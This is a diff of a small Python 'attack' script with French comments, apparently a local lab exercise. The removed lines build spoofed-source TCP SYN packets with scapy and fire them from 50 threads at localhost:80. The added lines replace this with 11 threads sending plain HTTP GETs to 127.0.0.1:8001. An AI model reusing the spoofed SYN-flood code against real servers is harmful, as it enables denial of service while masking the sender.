@@ -1,29 +1,19 @@
-from scapy.all import *
 import threading
+import requests
 
 # Cibles
-target_ip = "localhost"
-target_port = 80
+target_ip = "127.0.0.1"
+target_port = 8001
 
-# Liste d'IP à "spoof"
-fake_ips = ["192.168.1.201", "192.168.1.202", "192.168.1.203"]
+threads = 11
 
-
-threads = 50
-
-def attack(fake_ip):
+def attack():
     try:
-        ip = IP(src=fake_ip, dst=target_ip)
-        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")  # Flag SYN pour une requête TCP
-        raw = Raw(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
-        packet = ip / tcp / raw
-
-        send(packet, verbose=0)
+        requests.get("http://127.0.0.1:" + str(target_port))
     except Exception as e:
         print(f"Erreur lors de l'attaque: {e}")
 
 for i in range(threads):
-    fake_ip = fake_ips[i % len(fake_ips)]
-    thread = threading.Thread(target=attack, args=(fake_ip,))
+    thread = threading.Thread(target=attack)
     thread.start()
 
